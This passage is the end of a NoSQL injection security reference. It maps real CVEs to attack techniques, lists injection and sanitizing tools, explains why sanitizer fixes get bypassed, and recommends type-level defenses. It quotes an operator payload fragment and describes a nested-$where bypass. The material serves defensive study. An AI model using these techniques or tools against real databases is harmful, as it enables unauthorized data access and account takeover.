| §1-1 + §8-1 (Blind extraction of reset tokens) | Rocket.Chat HackerOne #1130874 | Post-auth blind NoSQL injection leaking password reset tokens and 2FA secrets → admin account takeover → RCE. $3,000+ bounty |
| §8-2 (Timing oracle on unsanitized selectors) | CVE-2023-28359 (Rocket.Chat) | Time-based blind data extraction via unsanitized MongoDB selectors |
| §5-1 (N1QL injection in Sync Gateway) | CVE-2019-9039 (Couchbase Sync Gateway) | N1QL statement injection via `_all_docs` endpoint parameters |
| §5-5 (Elasticsearch scripting) | Multiple CVEs (Elasticsearch < 1.2) | Remote code execution via Groovy scripting in search queries |
| §5-6 (Redis Lua sandbox escape) | CVE-2022-24735 (Redis < 7.0.0/6.2.7) | Arbitrary Lua code execution with elevated privileges |

---

## Detection Tools

| Tool | Target Scope | Core Technique |
|------|-------------|---------------|
| **NoSQLMap** (Python, open-source) | MongoDB, CouchDB; planned Redis, Cassandra | Automated operator injection, default config exploitation, data dumping |
| **nosqli** (Go CLI, open-source) | MongoDB via HTTP endpoints | Error-based, boolean blind, and timing injection tests |
| **StealthNoSQL** (CLI, open-source) | MongoDB, CouchDB | Smart enumeration: auto database/collection/document discovery |
| **N1QLMap** (Python, open-source) | Couchbase N1QL | N1QL injection exploitation, data extraction, SSRF via CURL |
| **NoSQLi Scanner** (Burp Suite extension) | MongoDB via HTTP | Passive/active scanning for NoSQL injection within Burp Suite |
| **Burp-NoSQLiScanner** (Burp Suite extension) | MongoDB, broader NoSQL | Automated detection of operator and syntax injection patterns |
| **NoSQLAttack** (Python, open-source) | MongoDB | Automated exploitation of default configuration weaknesses and injection |
| **mongoshake / mongo-sanitize** (Node.js middleware) | MongoDB (defensive) | Strips `$` and `.` prefixed keys from user input |
| **express-mongo-sanitize** (Node.js middleware) | MongoDB (defensive) | Sanitizes req.body/query/params/headers; removes operator keys |
| **Mongoose sanitizeFilter** (ODM option) | MongoDB via Mongoose (defensive) | Built-in query filter sanitization (enabled via `sanitizeFilter: true`) |

---

## Summary: Core Principles

**The Fundamental Property**: NoSQL injection exists because NoSQL databases accept *structured query objects* — not just strings — as query parameters. In MongoDB, a query parameter can be either a scalar value (`"admin"`) or an operator expression (`{"$ne":""}`), and the database interprets them differently based on structure. This design, where the query language is embedded in the data format (JSON), means that any unvalidated user input that reaches a query can carry query logic with it. Unlike SQL, where the injection boundary is always a string parse (breaking out of quotes), NoSQL injection exploits a *type boundary* (scalar vs. object) that is invisible at the string level.

**Why Incremental Fixes Fail**: The NoSQL injection attack surface resists incremental patching for three structural reasons. First, the fragmentation across database engines means each fix is engine-specific — sanitizing MongoDB operators does nothing for Cypher injection or Redis command injection. Second, new injection surfaces emerge at every abstraction layer: the database query API, the aggregation framework, the ODM, the middleware, the HTTP parameter parser. A fix at one layer (e.g., `express-mongo-sanitize`) can be bypassed by exploiting a different layer (e.g., Content-Type switching, prototype pollution, ODM-level populate().match()). Third, operator nesting creates recursive bypass opportunities — as demonstrated by CVE-2025-23061, where a sanitizer checking only top-level keys was bypassed by nesting `$where` inside `$or`. Each "fix" that addresses a specific nesting pattern creates a new race between defenders adding depth checks and attackers finding new nesting paths.

**The Structural Solution**: The only reliable defense is to enforce a strict type boundary between user input and query structure. This means: (1) never passing user-controlled objects directly into queries — always extract scalar values and construct query objects server-side; (2) validating input types at the API boundary using schema validation (Joi, Ajv, JSON Schema) that rejects objects/arrays where scalars are expected; (3) using parameterized queries or query builders that structurally separate user values from query operators; and (4) disabling unnecessary capabilities (server-side JavaScript via `--noscripting`, CURL in N1QL, Groovy scripting in Elasticsearch). The defense must operate at the *type system level*, not the *string pattern level* — stripping `$` characters is a band-aid; ensuring user input can never be interpreted as a query operator is the structural fix.

---

## References

- PortSwigger Web Security Academy — NoSQL Injection: https://portswigger.net/web-security/nosql-injection
- OWASP Web Security Testing Guide — Testing for NoSQL Injection: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
- PayloadsAllTheThings — NoSQL Injection: https://swisskyrepo.github.io/PayloadsAllTheThings/NoSQL%20Injection/
- HackTricks — NoSQL Injection: https://book.hacktricks.wiki/pentesting-web/nosql-injection.html
- Soroush Dalili — MongoDB NoSQL Injection with Aggregation Pipelines (2024): https://soroush.me/blog/2024/06/mongodb-nosql-injection-with-aggregation-pipelines/
- OPSWAT — Technical Discovery of Mongoose CVE-2025-23061 and CVE-2024-53900: https://www.opswat.com/blog/technical-discovery-mongoose-cve-2025-23061-cve-2024-53900
- ZeroPath — MongoDB CVE-2025-6713 Unauthorized Data Access: https://zeropath.com/blog/mongodb-cve-2025-6713-unauthorized-data-access
- WithSecure Labs — N1QL Injection: Kind of SQL Injection in a NoSQL Database: https://labs.withsecure.com/publications/n1ql-injection-kind-of-sql-injection-in-a-nosql-database
- Intigriti — NoSQL Injection Advanced Exploitation Guide: https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-nosql-injection-nosqli-vulnerabilities
- Imperva — NoSQL SSJI Authentication Bypass: https://www.imperva.com/blog/nosql-ssji-authentication-bypass/
- NullSweep — NoSQL Injection Cheatsheet: https://nullsweep.com/nosql-injection-cheatsheet/
- SecOps Group — A Pentester's Guide to NoSQL Injection: https://secops.group/a-pentesters-guide-to-nosql-injection/
- PMC/ScienceDirect — The MongoDB Injection Dataset (2024): https://pmc.ncbi.nlm.nih.gov/articles/PMC10997947/
- Rocket.Chat HackerOne Report #1130874: https://hackerone.com/reports/1130874
- OWASP NoSQL Security Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/NoSQL_Security_Cheat_Sheet.html

---

*This document was created for defensive security research and vulnerability understanding purposes.*
